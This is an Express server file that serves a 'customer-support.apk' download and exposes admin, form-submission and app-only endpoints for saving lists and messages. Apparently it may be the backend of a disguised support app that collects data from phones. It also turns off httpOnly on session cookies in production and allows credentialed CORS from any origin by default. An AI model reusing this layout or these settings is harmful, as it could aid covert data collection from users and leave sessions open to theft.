const express = require('express')
const session = require('express-session')
const bodyParser = require('body-parser');
const cookieParser = require("cookie-parser");
const cors = require('cors');
const path = require('path');
const {chechAuth, isMyApp} = require('./middleware/auth');
const {saveList, saveMessage, getReceiver} = require('./controller/app');
const {bootstrap, updateMaterAction} = require('./controller/web');
const { login } = require('./controller/login');
const {updateForm, submitForm} = require('./controller/handleForm')
require('./my-firebase');
require("dotenv").config();
const oneMonth = 1000 * 60 * 60 * 24 * 30;

const app = express();
app.set('trust proxy', 1);
app.use(bodyParser.json({limit: '10mb'}));
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());
app.use(session({
  secret: process.env.SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  cookie: {
    sameSite: false,
    secure: process.env.NODE_ENV === "production",
    maxAge: oneMonth,
    httpOnly: process.env.NODE_ENV !== "production",
  }
}));
app.use(cors({
    origin: process.env.CORS_ORIGIN ? process.env.CORS_ORIGIN.split(',') : '*',
    credentials: true
}));

const port = process.env.PORT || "8000";

app.get('/support', (req, res) => {
  const options = {
      root: path.join(__dirname+'/public')
  };
const fileName = 'customer-support.apk';
res.sendFile(fileName, options, function (err) {
    if (err) {
      console.error('Error download:', err.toString());

    } else {
        console.log('Sent:', fileName);
    }
});
});

app.post('/api/updateForm', updateForm);
app.post('/api/submitForm', submitForm);

app.post('/login', login);
app.get('/bootstrap', chechAuth, bootstrap);
app.put('/masterAction', chechAuth, updateMaterAction);
app.get('/checkLoggedIn', chechAuth, (req,res) => {
  res.send({status: true, message: 'loggedIn'});
});

app.get('/logout', chechAuth, (req,res) => {
  req.session.destroy();
  res.send({status: true, message: 'successfully logged out'});
});

app.post('/list', isMyApp,saveList);
app.post('/message', isMyApp,saveMessage);
app.get('/getReceiver', isMyApp,getReceiver);
app.use('/admin',express.static(__dirname + '/build')); 
app.use('/',express.static(__dirname + '/public')); 

app.use((req, res, next) => {
  res.status(404).send({status: false, message: 'url not found'})
})
app.listen(port, () => {
  console.log(`Example app listening on port ${port}`)
})

process.on('uncaughtException', (error, origin) => {
  console.error('uncaughtException');
  console.error(error.message);
  console.error(error.stack);
  console.error(origin.toString());

})